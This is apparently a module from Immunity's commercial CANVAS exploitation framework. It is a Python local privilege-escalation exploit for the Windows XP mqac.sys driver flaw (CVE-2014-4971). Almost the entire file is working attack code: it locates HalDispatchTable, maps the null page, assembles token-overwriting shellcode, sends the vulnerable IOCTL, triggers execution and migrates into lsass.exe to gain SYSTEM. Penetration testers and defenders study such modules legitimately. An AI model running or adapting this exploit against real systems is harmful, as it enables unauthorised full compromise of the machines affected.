
#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")

import struct
from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine


NAME = 'mqac'
DESCRIPTION = 'Windows mqac.sys Local Privilege Escalation'

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Date public']    = '11/28/2013'
DOCUMENTATION['CVE Name']       = 'CVE-2014-4971'
DOCUMENTATION['CVE Url']        = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-4971'
DOCUMENTATION['CVSS']           = 7.2
DOCUMENTATION['References']     = 'https://www.korelogic.com/Resources/Advisories/KL-001-2014-003.txt'

VERSION = '1.0'

PROPERTY            = {}
PROPERTY['TYPE']    = 'Exploit'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [['Windows']]
PROPERTY['VERSION'] = ['XP']
PROPERTY['MS PATCHES'] = ["KB2993254"]

DOCUMENTATION['Notes'] = """
Tested on:
Windows XP Professional SP3 English

Constraints:
In order to work the Message Queuing component must be installed

Usage:
Win32/MOSDEF$ runmodule mqac
"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name                   = NAME
        self.result                 = 0
        self.device_name             = "\\\\.\\MQAC"
        self.ioctl_code             = 0x1965020f
        self.ioctl_buf_addr         = 0x0
        self.ioctl_buf_len          = 0
        self.ioctl_buf              = ""
        self.minor_version          = 0
        self.major_version          = 0
        self.x64                    = 0

    def DeviceIoControlAddress(self, node, hDevice,IoControlCode,InBuffer=None,InBufferSize=0,OutBuffer=None,OutBufferSize=0):
        vars={}
        vars['hDevice']=hDevice
        vars['IoControlCode']=IoControlCode
        vars['InBuffer']=InBuffer
        vars['InBufferSize']=InBufferSize
        vars['OutBuffer']=OutBuffer
        vars['OutBufferSize']=OutBufferSize
        code="""
        #import "remote","kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "local","sendint" as "sendint"
        #import "int","hDevice" as "hDevice"
        #import "int","IoControlCode" as "IoControlCode"
        #import "string","InBuffer" as "InBuffer"
        #import "int","InBufferSize" as "InBufferSize"
        #import "int","OutBuffer" as "OutBuffer"
        #import "int","OutBufferSize" as "OutBufferSize"

        void main() {
          int ret;
          int cb;

          ret=DeviceIoControl(hDevice,IoControlCode,InBuffer,InBufferSize,OutBuffer,OutBufferSize,&cb,0);
          sendint(ret);
        }
        """
        node.shell.clearfunctioncache()
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        ret=node.shell.readint()
        node.shell.leave()
        return ret

    def create_shellcode(self):
        token_address = self.node.shell.get_process_token_ring0_address()
        self.log("[+] Process Ring0 Token Address: 0x%08x" % token_address)

        # offset to SePrivileges
        token_address = token_address + 0xA0

        asm = """
        push %ebx
        movl $0xTOKENADDRESS, %ebx
        mov $0x00000014, (%ebx)
        pop %ebx
        ret $0x8
        """

        asm = asm.replace("TOKENADDRESS", "%08x" % token_address)
        arch = 'x86'

        shellcode = mosdef.assemble(asm,arch)
        return shellcode

    def memcpy(self, dest, data):
        vars = {}
        vars["dest"] = dest

        code="""
        //start of code
        #import "local", "readintfromself" as "readintfromself"
        #import "local", "readdatafromself" as "readdatafromself"

        """

        code += """
        #import "int", "dest" as "dest"
        """

        code += """

        void main()
        {  int size;

           size = readintfromself();
           readdatafromself(dest, size);
        }
        """
        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(request)

        self.node.shell.sendint(len(data))
        self.node.shell.writebuf(data)

        self.node.shell.leave()

    # Test to make sure the driver is accessible
    def test(self):
        if self.node.nodetype == "win32Node":
            if self.node.shell.has_wow_64 and self.node.shell.is_wow_64:
                self.log('[EE] This module does not currently support WoW64. Aborting')
                return 0
            self.log("[+] Running on 32-bit")
        else:
            self.log('[EE] This module does not support node type: %s' % self.node.nodetype)
            return 0

        # Check our Windows version is >= Vista
        ret, os_version = self.node.shell.GetVersionEx()

        if not ret:
            self.log("[EE] Failed to determine OS version. Exiting.")
            return 0
        else:
            if not os_version['Major Version'] == 5 and (os_version['Minor Version'] == 1 or os_version['Minor Version']==3):
                self.log("[EE] This exploit only supports Windows XP SP3")
                return 0

        self.major_version = os_version["Major Version"]
        self.minor_version = os_version["Minor Version"]

        # CreateFile* constants
        GENERIC_READ  = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 0x3

        self.h_driver_device = self.node.shell.CreateFile(self.device_name,0, 0, 0, OPEN_EXISTING, 0)

        if self.h_driver_device <= 0:
            self.log("[EE] Driver Not Available. Exiting. Handle: 0x%08x" % self.h_driver_device)
            self.log("[EE] The exploit requires Message Queuing installed to work")
            return 0
        else:
            self.log("[+] Driver Available")
            self.log("[+] Handle: 0x%08x" % self.h_driver_device)

        return 1

    def test_lsass_access(self):
        # test that we even need to use an exploit
        process_list = self.node.shell.processlist()

        for process in process_list:
            if process["exe"] == "lsass.exe":
                lsass_pid = process["pid"]
                self.log("[+] Found LSASS.exe PID: %d" % lsass_pid)
                break

        # try to get a handle to lsass
        h_lsass = self.node.shell.openprocess(lsass_pid)

        if h_lsass:
            self.log("[+] Handle opened to LSASS successfully!")
            ret = 1
        else:
            self.log("[-] Not enough privileges to access LSASS")
            ret = 0

        self.node.shell.CloseHandle(h_lsass)

        return ret

    def run_attack(self, node):
        self.node = node

        # test for the driver
        ret = self.test()

        if not ret:
            return ret

        ret,addresses = node.shell.EnumDeviceDrivers()
        if ret != 1:
            self.log('[EE] EnumDeviceDrivers failed. Cannot continue.')
            return 0
        for imagebase in addresses:
            ret,basename = node.shell.GetDeviceDriverBaseName(imagebase)
            if ret!=0 and basename.find('k\0r\0n\0l\0') != -1:
                break
        if basename.find('k\0r\0n\0l\0') == -1:
            self.log('[EE] NT kernel binary basename not found. Cannot continue.')
            return 0
        self.log('[+] %s loaded at 0x%08x' % (basename, imagebase))
        HandleKernel = node.shell.LoadLibraryExW(basename+'\0\0') #widestring has to be 0 terminated!
        HalDispatchTable = node.shell.GetProcAddress(HandleKernel,'HalDispatchTable')
        HalDispatchTable = HalDispatchTable - HandleKernel + imagebase
        self.log('[+] HalDispatchTable: 0x%08x'%(HalDispatchTable))

        # allocate null page
        ret = node.shell.NtAllocateVirtualMemory(0x0)
        if ret != 0:
            self.log("[EE] Failed to allocate null page")
            return 0

        # build our privilege enabling shellcode
        shellcode = self.create_shellcode()
        shellcode = '\x90'*100 + shellcode
        self.memcpy(ret, shellcode)

        self.log("[+] Firing IOCTL")
        ret=self.DeviceIoControlAddress(node, self.h_driver_device, self.ioctl_code, shellcode, 0x54, HalDispatchTable+4, 0)
        node.shell.CloseHandle(self.h_driver_device)
        self.log("[+] IOCTL sent")

        self.log('[+] DeviceIoControl()=0x%08x' % (ret))
        self.log('[+] Sleeping 3 seconds')
        time.sleep(3)
        node.shell.NtQueryIntervalProfile(2) #ProfileTotalIssues

        ret = self.test_lsass_access()

        if ret:
            self.log("[+] Exploit was successful! Migrating to lsass.exe now")

            migrate = self.engine.getModuleExploit("mosdefmigrate")
            migrate.link(self)
            migrate.argsDict['pid'] = 'lsass.exe'
            ret = migrate.run()

            if not ret:
                self.log("[EE] Couldn't migrate, aborting..")
                ret = 0
            else:
                self.log("[+] Exploit succeeded. Now living in lsass.exe")
                ret = 1

        else:
            # failed to get a handle to lsass.exe our exploit failed
            ret = 0

        return ret

    def run(self):
        self.setInfo('%s (in progress)' % (NAME))
        success = 0
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('[-] Node %s not a Win32 node' % (node.getname()))
                continue
            ret = self.run_attack(node)
            if ret == 1:
                self.log("[+] Successfully migrated to LSASS. We are now SYSTEM")
                success = 1
        return success

if __name__ == '__main__':
    print 'This Windows local module is meant to be run only within CANVAS'
